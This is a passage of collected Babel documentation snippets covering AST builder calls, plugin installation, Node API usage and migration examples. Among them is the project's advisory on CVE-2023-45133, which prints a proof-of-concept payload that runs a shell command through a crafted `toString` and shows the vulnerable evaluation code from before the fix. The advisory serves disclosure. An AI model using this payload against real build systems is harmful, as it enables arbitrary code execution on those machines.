`TSEnumBody` AST node using the `t.tsEnumBody` builder function. It takes an array of `TSEnumMember` nodes as an argument. The created node represents the body of a TypeScript enum.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_169\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsEnumBody(members);\n```\n\n----------------------------------------\n\nTITLE: Checking for Accessor Node Type with Babel\nDESCRIPTION: Checks if a given AST node is an `Accessor` node using `t.isAccessor(node)`. This is a deprecated alias for checking `ClassAccessorProperty` nodes and will be removed in Babel 8.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_253\n\nLANGUAGE: javascript\nCODE:\n```\nt.isAccessor(node);\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Plugin External Helpers with npm/yarn\nDESCRIPTION: This command installs the `@babel/plugin-external-helpers` Babel plugin as a development dependency using npm. Yarn can be used instead, as shown by the `npm2yarn` label.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-external-helpers.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-external-helpers\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Browserify\nDESCRIPTION: This snippet shows how to switch from Reactify to Babelify in Browserify for JSX transformation. It involves replacing `reactify` with `babelify` in the Browserify command.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ browserify -t reactify main.js\n```\n\n----------------------------------------\n\nTITLE: Install Babel Development Dependencies (npm to yarn)\nDESCRIPTION: This snippet demonstrates installing `@babel/register` and `@babel/core` as development dependencies using npm and provides the equivalent yarn command. It requires npm or yarn to be installed.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/mocha/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/register @babel/core\n```\n\n----------------------------------------\n\nTITLE: Loading Plugins/Presets before @babel/register\nDESCRIPTION: This snippet shows that you must load your plugins/presets using `require` before you require `@babel/register` to avoid re-entrant compilation issues.\nSOURCE: https://github.com/babel/website/blob/main/docs/register.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/register\")({\n  // ...\n});\n\nrequire(\"./my-plugin\");\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via Node API\nDESCRIPTION: Uses the @babel/plugin-bugfix-firefox-class-in-computed-class-key plugin via the Babel Node API. It transforms the provided code string using the transformSync method, specifying the plugin in the plugins array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-firefox-class-in-computed-class-key.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-bugfix-firefox-class-in-computed-class-key\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Node API Usage: Transforming code via Node.js\nDESCRIPTION: Shows how to use the Babel plugin through the Node.js API.  It transforms the provided 'code' string using the transform-inline-consecutive-adds plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-consecutive-adds.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-inline-consecutive-adds\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Decorators with accessor static fields (JavaScript)\nDESCRIPTION: Demonstrates the usage of accessor static fields with derived classes and how the value is properly inherited without throwing an error.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nclass Base {\n  static accessor x = 2;\n}\nclass Derived extends Base {}\n\nDerived.x; // Used to throw, now returns `2`\n```\n\n----------------------------------------\n\nTITLE: Imports Hoisting: Before Babel 5.x\nDESCRIPTION: Shows the execution order of imports before Babel 5.x, where imports were inlined at their declaration position in the code. This is the before state of import hoisting.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_20\n\nLANGUAGE: javascript\nCODE:\n```\nglobal.test = 'test'\nimport './test'\n```\n\nLANGUAGE: javascript\nCODE:\n```\n'use strict';\n\nglobal.test = 'test';\nrequire('./test');\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Intersection Type\nDESCRIPTION: Creates a TypeScript intersection type node in the AST. Requires an array of `TSType` nodes representing the types being intersected. This is used to define a type that is the intersection of multiple types.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_184\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsIntersectionType(types);\n```\n\n----------------------------------------\n\nTITLE: Convert npm install to yarn add\nDESCRIPTION: This snippet demonstrates how to convert an npm install command with the --save-dev flag to its equivalent yarn add command. It installs the 'babel-brunch' package as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/brunch/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev babel-brunch\n```\n\n----------------------------------------\n\nTITLE: Use Exponentiation Operator Plugin via CLI Shell\nDESCRIPTION: This command demonstrates how to use the @babel/plugin-transform-exponentiation-operator via the Babel CLI.  It takes a script.js file as input and transforms it using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-exponentiation-operator.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-exponentiation-operator script.js\n```\n\n----------------------------------------\n\nTITLE: Tagged Template Literal (JavaScript)\nDESCRIPTION: This JavaScript code uses a tagged template literal.  The `mutableTemplateObject` assumption tells Babel to skip using `Object.freeze` for the template object, essentially using the `taggedTemplateLiteralLoose` helper.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet str = tag`a`;\n```\n\n----------------------------------------\n\nTITLE: Creating a VariableDeclaration with Babel\nDESCRIPTION: Creates a `VariableDeclaration` AST node using the `t.variableDeclaration` method. This node represents a variable declaration, where `kind` is the kind of declaration (`\"var\"`, `\"let\"`, `\"const\"`, `\"using\"`, or `\"await using\"`), and `declarations` is an array of `VariableDeclarator` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_246\n\nLANGUAGE: javascript\nCODE:\n```\nt.variableDeclaration(kind, declarations);\n```\n\n----------------------------------------\n\nTITLE: Checking for Binary Node Type with Babel\nDESCRIPTION: Checks if a given AST node is a `Binary` node using `t.isBinary(node)`. This is an alias covering both `BinaryExpression` and `LogicalExpression` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_254\n\nLANGUAGE: javascript\nCODE:\n```\nt.isBinary(node);\n```\n\n----------------------------------------\n\nTITLE: Reflect API Usage in JavaScript\nDESCRIPTION: Demonstrates the usage of the Reflect.ownKeys method to retrieve all own keys (including symbols) of an object. The code defines an object with properties and a symbol, then uses Reflect.ownKeys to retrieve an array containing the names of all own properties, including symbol.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_32\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar O = {a: 1};\nObject.defineProperty(O, 'b', {value: 2});\nO[Symbol('c')] = 3;\n\nReflect.ownKeys(O); // ['a', 'b', Symbol(c)]\n\nfunction C(a, b){\n  this.c = a + b;\n}\nvar instance = Reflect.construct(C, [20, 22]);\ninstance.c; // 42\n```\n\n----------------------------------------\n\nTITLE: Configure generatorOpts with importAttributesKeyword JSON\nDESCRIPTION: This JSON configuration snippet shows how to configure `@babel/generator`'s `importAttributesKeyword` option to specify the keyword used for import attributes when emitting code. The `generatorOpts` object is passed to the generator during code generation. It modifies how Babel emits code with import attributes.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-attributes.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"generatorOpts\": {\n    \"importAttributesKeyword\": \"with\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Plugin\nDESCRIPTION: Installs the `@babel/plugin-syntax-import-meta` plugin as a development dependency using npm. This allows Babel to parse and transform code containing the `import.meta` syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-meta.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-import-meta\n```\n\n----------------------------------------\n\nTITLE: Installing babel-helper-flip-expressions with npm\nDESCRIPTION: This command installs the babel-helper-flip-expressions package as a development dependency using npm. The --save-dev flag ensures that the package is added to the devDependencies section of the package.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-flip-expressions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install babel-helper-flip-expressions --save-dev\n```\n\n----------------------------------------\n\nTITLE: Function Wrapping Example - Output JavaScript\nDESCRIPTION: This example shows the JavaScript code after the @babel/helper-wrap-function helper is applied. The original function is now wrapped in a function called `_wrapper`.  The helper injects the `_wrapper` function call around the existing function.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-wrap-function.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n_wrapper(function () {\n}());\n```\n\n----------------------------------------\n\nTITLE: Install plugin via npm Shell\nDESCRIPTION: This command installs the `@babel/plugin-syntax-async-generators` package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-generators.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-async-generators\n```\n\n----------------------------------------\n\nTITLE: Fix loose `transform-es2015-for-of` with label - JavaScript\nDESCRIPTION: This JavaScript code illustrates a bug fix in the `transform-es2015-for-of` plugin where labels were incorrectly dropped when used with `for...of` loops. The fix ensures that labels are preserved during the transformation, allowing `continue` statements to correctly target the intended loop.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nb: for (let c of d()) { // previously, the label was completely dropped\n  for (let e of f()) {\n    continue b;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating ForOfStatement in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `ForOfStatement` AST node using Babel's `t.forOfStatement` method. The `left` (a `VariableDeclaration` or `LVal`), `right` (an `Expression`), and `body` (a `Statement`) parameters are required.  The `await` parameter is optional and defaults to `false`. This node represents a `for...of` loop.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_70\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.forOfStatement(left, right, body, await);\n```\n\n----------------------------------------\n\nTITLE: Installing Object Rest Spread Syntax Plugin\nDESCRIPTION: Installs the @babel/plugin-syntax-object-rest-spread package as a development dependency using npm. This command prepares the project to use the plugin for parsing object rest and spread syntax within Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-object-rest-spread.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-object-rest-spread\n```\n\n----------------------------------------\n\nTITLE: F# Pipeline with Async Chain\nDESCRIPTION: This JavaScript example showcases a longer chain of operations including `await` using the F# Pipelines approach. It shows how async operations can be integrated into a pipeline using this proposal.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\npromise\n  |> await\n  |> (x => doubleSay(x, ', '))\n  |> capitalize\n  |> (x => x + '!')\n  |> (x => new User.Message(x))\n  |> (x => stream.write(x))\n  |> await\n  |> console.log;\n```\n\n----------------------------------------\n\nTITLE: Variable Mangling Example\nDESCRIPTION: This example demonstrates the `babel-plugin-minify-mangle-names` plugin. It shows how variable names are shortened to reduce code size. Context and scope are considered during the renaming process.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar globalVariableName = 42;\nfunction foo() {\n  var longLocalVariableName = 1;\n  if (longLocalVariableName) {\n    console.log(longLocalVariableName);\n  }\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar globalVariableName = 42;\nfunction foo() {\n  var a = 1;\n  if (a) {\n    console.log(a);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Do Expressions in Babel 7\nDESCRIPTION: Shows how to use do expressions within Babel 7 to create block-scoped expressions. This can be useful in situations where a statement is needed but an expression is expected.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_28\n\nLANGUAGE: javascript\nCODE:\n```\nvar a = do { if (true) { 'hi'; } };\n```\n\n----------------------------------------\n\nTITLE: Flow Exact Object Type Annotations JavaScript\nDESCRIPTION: Illustrates the syntax for exact object type annotations in Flow. This allows specifying that an object must have exactly the properties defined in the type annotation, and no others. Requires babylon parser support.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Example\nvar a : {| x: number, y: string |} = { x: 0, y: 'foo' };\n```\n\n----------------------------------------\n\nTITLE: NewExpression AST (Babel 8)\nDESCRIPTION: Babel 8 AST for NewExpression, using `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_34\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"NewExpression\",\n  \"callee\": Identifier(\"Component\"),\n  \"arguments\": [],\n  \"typeArguments\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n    \"params\": [{\n      \"type\": \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ES2015 Class Example (Input)\nDESCRIPTION: An example of an ES2015 class definition with a constructor and a method. This snippet represents the input code that Babel will transform.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Test {\n  constructor(name) {\n    this.name = name;\n  }\n\n  logger() {\n    console.log(\"Hello\", this.name);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding ECMAScript package in Meteor\nDESCRIPTION: This command adds the `ecmascript` package to your Meteor project.  It uses the Meteor package manager to install the necessary dependencies and enable ECMAScript support. This enables the use of modern JavaScript syntax in your Meteor application.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/meteor/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nmeteor add ecmascript\n```\n\n----------------------------------------\n\nTITLE: Using TSInstantiationExpression (TS)\nDESCRIPTION: Illustrates the AST for TSInstantiationExpression in Babel 7 and Babel 8.  The `typeParameters` property is renamed to `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_48\n\nLANGUAGE: typescript\nCODE:\n```\nfn<string>\n\n// AST in Babel 7\n{\n  type: \"TSInstantiationExpression\",\n  expression: Identifier(\"fn\"),\n  typeParameters: {\n    type: \"TSTypeParameterInstantiation\",\n    params: [{\n      type: \"TSStringKeyword\"\n    }]\n  }\n}\n\n// AST in Babel 8\n{\n  type: \"TSInstantiationExpression\",\n  expression: Identifier(\"fn\"),\n  typeArguments: {\n    type: \"TSTypeParameterInstantiation\",\n    params: [{\n      type: \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Variance Annotations Example\nDESCRIPTION: This TypeScript code demonstrates explicit variance annotations introduced in TypeScript 4.7. The example defines `Provider`, `Consumer`, `Mapper`, and `Processor` types using `out`, `in`, and `in out` to specify variance for their type arguments. No specific dependencies are needed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-05-19-7.18.0.md#_snippet_2\n\nLANGUAGE: TypeScript\nCODE:\n```\ntype Provider<out T> = () => T;\ntype Consumer<in T> = (x: T) => void;\ntype Mapper<in T, out U> = (x: T) => U;\ntype Processor<in out T> = (x: T) => T;\n```\n\n----------------------------------------\n\nTITLE: Shell Blacklisting ES7 Transformers\nDESCRIPTION: Demonstrates how to use the 6to5 (now Babel) CLI to blacklist all ES7 transformers. This is achieved by using the `--blacklist` option followed by `es7`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-01-27-2to3.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ 6to5 --blacklist es7\n```\n\n----------------------------------------\n\nTITLE: TSConstructSignatureDeclaration Parameters/ReturnType Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `parameters` to `params` and `typeAnnotation` to `returnType` in TSConstructSignatureDeclaration.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_14\n\nLANGUAGE: typescript\nCODE:\n```\ninterface Foo {\n  new (x: number): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Object.assign Example (Output)\nDESCRIPTION: Shows the transformed output of Object.assign after applying the Babel plugin. It utilizes a helper function (_extends) to achieve the same functionality.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-assign.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _extends = ...;\n\n_extends(a, b);\n```\n\n----------------------------------------\n\nTITLE: Function.sent in Babel 7\nDESCRIPTION: Shows the use of function.sent property within Babel 7, related to generator functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_32\n\nLANGUAGE: javascript\nCODE:\n```\nfunction.sent\n```\n\n----------------------------------------\n\nTITLE: Numeric Literal Minification (JavaScript)\nDESCRIPTION: Demonstrates how the minified option in babel-generator affects the output of numeric literals. It will print the shorter representation of the number when possible.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_19\n\nLANGUAGE: JavaScript\nCODE:\n```\n5e1;\n5e4;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n50;\n5e4;\n```\n\n----------------------------------------\n\nTITLE: Creating a Switch Case Node in Babel\nDESCRIPTION: Creates a `SwitchCase` AST node using the Babel types module. This node represents a case in a switch statement, accepting a test expression and an array of consequent statements.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_155\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.switchCase(test, consequent);\n```\n\n----------------------------------------\n\nTITLE: Installing babel-helper-is-void-0 using npm\nDESCRIPTION: This command installs the babel-helper-is-void-0 package as a development dependency using npm. The --save-dev flag ensures that the package is added to the devDependencies section of the package.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-is-void-0.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install babel-helper-is-void-0 --save-dev\n```\n\n----------------------------------------\n\nTITLE: Transform export-ns-from JavaScript\nDESCRIPTION: This plugin provides a shorthand to import and re-export a namespace. It transforms the `export * as ns from \"mod\"` syntax into standard import and export statements.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport * as ns from \"mod\";\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as ns from \"mod\";\nexport {ns};\n```\n\n----------------------------------------\n\nTITLE: Install Undefined to Void Plugin: npm/yarn\nDESCRIPTION: This shell command installs the `babel-plugin-transform-undefined-to-void` package as a development dependency using npm or yarn. It's a necessary step before using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-undefined-to-void.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-undefined-to-void --save-dev\n```\n\n----------------------------------------\n\nTITLE: Loading external scripts with src attribute\nDESCRIPTION: This example demonstrates loading external JavaScript files using the src attribute within a script tag configured to use @babel/standalone. This allows external files to be transpiled.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/babel\" src=\"foo.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Flow Type Annotation Stripped JavaScript\nDESCRIPTION: This is the output JavaScript code after the @babel/preset-flow has processed the input code. The type annotations have been removed, resulting in standard JavaScript syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-flow.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo(one, two, three) {}\n```\n\n----------------------------------------\n\nTITLE: Usage via Node API\nDESCRIPTION: This JavaScript code demonstrates how to use the Babel Node API to transform code using the @babel/plugin-transform-parameters plugin. It uses the transformSync method to transform the 'code' string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-parameters.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-parameters\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Installation via npm Shell\nDESCRIPTION: This shell command installs the @babel/plugin-transform-flow-strip-types package as a development dependency using npm. The `--save-dev` flag ensures the package is added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-strip-types.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-flow-strip-types\n```\n\n----------------------------------------\n\nTITLE: Initializing Babel in C# React Environment\nDESCRIPTION: This code snippet demonstrates how to access the Babel transformer within a C# React environment using `ReactEnvironment.Current.Babel`. The Babel instance is then assigned to a variable for later use.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/dotnet/usage.md#_snippet_0\n\nLANGUAGE: C#\nCODE:\n```\nvar babel = ReactEnvironment.Current.Babel;\n```\n\n----------------------------------------\n\nTITLE: Method Extraction with DOM event (ES7)\nDESCRIPTION: This JavaScript (ES7) snippet demonstrates using method extraction with the `::` operator to bind the `view.reset` method to a click event on elements with the class 'some-link'.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n$(\".some-link\").on(\"click\", ::view.reset);\n```\n\n----------------------------------------\n\nTITLE: Transform for-of Loop with loose mode (Input)\nDESCRIPTION: This JavaScript code demonstrates a simple for-of loop that iterates over the elements of an array named 'foo'. This is the input code when loose mode is enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nfor (var i of foo) {\n}\n```\n\n----------------------------------------\n\nTITLE: Install Experimental React (Shell)\nDESCRIPTION: This command installs the experimental versions of `react` and `react-dom` using npm. This is necessary to test the new JSX transform.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nnpm install react@experimental react-dom@experimental\n```\n\n----------------------------------------\n\nTITLE: Decorator with Object Property (JavaScript)\nDESCRIPTION: Example of using a decorator stored in an object property.  The decorator is now called using the object as `this` instead of `undefined`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nlet MyDecs = {\n  dec() {\n    console.log(this); // Now logs `MyDecs` instead of `undefined`\n  }\n};\n\n@MyDecs.dec class {}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm/yarn\nDESCRIPTION: Installs the @babel/plugin-syntax-function-bind plugin as a development dependency using npm or yarn.  This allows Babel to parse the function bind syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-function-bind.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-function-bind\n```\n\n----------------------------------------\n\nTITLE: Exploiting Object Expressions with toString (JavaScript)\nDESCRIPTION: This code shows how to exploit object expressions by defining a `toString` property that contains a malicious function. When the object is converted to a string, the function is executed, allowing arbitrary code execution. The example uses `Number.constructor` to create the malicious function and assigns it to `toString`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-10-16-cve-2023-45133.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nString(({  toString: Number.constructor(\"console.log(process.mainModule.require('child_process').execSync('id').toString())\")}));\n```\n\n----------------------------------------\n\nTITLE: Importing Babel Polyfill\nDESCRIPTION: This JavaScript code shows how to import the entire `@babel/polyfill` library. This approach is simple but can lead to including unnecessary polyfills.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"@babel/polyfill\";\n```\n\n----------------------------------------\n\nTITLE: Installation via npm JavaScript\nDESCRIPTION: This shell command shows how to install the @babel/plugin-transform-modules-umd package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-modules-umd\n```\n\n----------------------------------------\n\nTITLE: Babel Traverse Evaluation Function (TypeScript)\nDESCRIPTION: This TypeScript code represents a snippet from `babel-traverse/src/path/evaluation.ts` showcasing the vulnerable `_evaluate` function before the fix. It shows how call expressions and object expressions are handled during static evaluation, leading to arbitrary code execution. The code relies on Babel's internal types and modules.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-10-16-cve-2023-45133.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nconst VALID_OBJECT_CALLEES = [\"Number\", \"String\", \"Math\"] as const;\nconst VALID_IDENTIFIER_CALLEES = [\n  \"isFinite\",\n  \"isNaN\",\n  \"parseFloat\",\n  \"parseInt\",\n  \"decodeURI\",\n  \"decodeURIComponent\",\n  \"encodeURI\",\n  \"encodeURIComponent\",\n  process.env.BABEL_8_BREAKING ? \"btoa\" : null,\n  process.env.BABEL_8_BREAKING ? \"atob\" : null,\n] as const;\n\nconst INVALID_METHODS = [\"random\"] as const;\n\nfunction isValidObjectCallee(\n  val: string\n): val is (typeof VALID_OBJECT_CALLEES)[number] {\n  return VALID_OBJECT_CALLEES.includes(\n    // @ts-expect-error val is a string\n    val\n  );\n}\n\nfunction isValidIdentifierCallee(\n  val: string\n): val is (typeof VALID_IDENTIFIER_CALLEES)[number] {\n  return VALID_IDENTIFIER_CALLEES.includes(\n    // @ts-expect-error val is a string\n    val\n  );\n}\n\nfunction isInvalidMethod(val: string): val is (typeof INVALID_METHODS)[number] {\n  return INVALID_METHODS.includes(\n    // @ts-expect-error val is a string\n    val\n  );\n}\n\nfunction _evaluate(path: NodePath, state: State): any {\n  /** snip **/\n  if (path.isObjectExpression()) {\n    const obj = {};\n    const props = path.get(\"properties\");\n    for (const prop of props) {\n      if (prop.isObjectMethod() || prop.isSpreadElement()) {\n        deopt(prop, state);\n        return;\n      }\n      const keyPath = (prop as NodePath<t.ObjectProperty>).get(\"key\");\n      let key;\n      // @ts-expect-error todo(flow->ts): type refinement issues ObjectMethod and SpreadElement somehow not excluded\n      if (prop.node.computed) {\n        key = keyPath.evaluate();\n        if (!key.confident) {\n          deopt(key.deopt, state);\n          return;\n        }\n        key = key.value;\n      } else if (keyPath.isIdentifier()) {\n        key = keyPath.node.name;\n      } else {\n        key = (\n          keyPath.node as t.StringLiteral | t.NumericLiteral | t.BigIntLiteral\n        ).value;\n      }\n      const valuePath = (prop as NodePath<t.ObjectProperty>).get(\"value\");\n      let value = valuePath.evaluate();\n      if (!value.confident) {\n        deopt(value.deopt, state);\n        return;\n      }\n      value = value.value;\n      // @ts-expect-error key is any type\n      obj[key] = value;\n    }\n    return obj;\n  }\n\n  /** snip **/\n  if (path.isCallExpression()) {\n    const callee = path.get(\"callee\");\n    let context;\n    let func;\n\n    // Number(1);\n    if (\n      callee.isIdentifier() &&\n      !path.scope.getBinding(callee.node.name) &&\n      (isValidObjectCallee(callee.node.name) ||\n        isValidIdentifierCallee(callee.node.name))\n    ) {\n      func = global[callee.node.name];\n    }\n\n    if (callee.isMemberExpression()) {\n      const object = callee.get(\"object\");\n      const property = callee.get(\"property\");\n\n      // Math.min(1, 2)\n      if (\n        object.isIdentifier() &&\n        property.isIdentifier() &&\n        isValidObjectCallee(object.node.name) &&\n        !isInvalidMethod(property.node.name)\n      ) {\n        context = global[object.node.name];\n        // @ts-expect-error property may not exist in context object\n        func = context[property.node.name];\n      }\n\n      // \"abc\".charCodeAt(4)\n      if (object.isLiteral() && property.isIdentifier()) {\n        // @ts-expect-error todo(flow->ts): consider checking ast node type instead of value type (StringLiteral and NumberLiteral)\n        const type = typeof object.node.value;\n        if (type === \"string\" || type === \"number\") {\n          // @ts-expect-error todo(flow->ts): consider checking ast node type instead of value type\n          context = object.node.value;\n          func = context[property.node.name];\n        }\n      }\n    }\n\n    if (func) {\n      const args = path\n        .get(\"arguments\")\n        .map((arg) => evaluateCached(arg, state));\n      if (!state.confident) return;\n\n      return func.apply(context, args);\n    }\n  }\n  /** snip **/\n}\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Browserify\nDESCRIPTION: This snippet shows how to switch from Reactify to Babelify in Browserify for JSX transformation. It involves replacing `reactify` with `babelify` in the Browserify command.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ browserify -t babelify main.js\n```\n\n----------------------------------------\n\nTITLE: Private Methods Example\nDESCRIPTION: This JavaScript code demonstrates a class `Foo` with a public field `publicField` initialized with the return value of a private method `#privateMethod`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  constructor() {\n    this.publicField = this.#privateMethod();\n  }\n\n  #privateMethod() {\n    return 42;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring the ES2015 Preset in .babelrc\nDESCRIPTION: Shows how to configure the `es2015` preset in 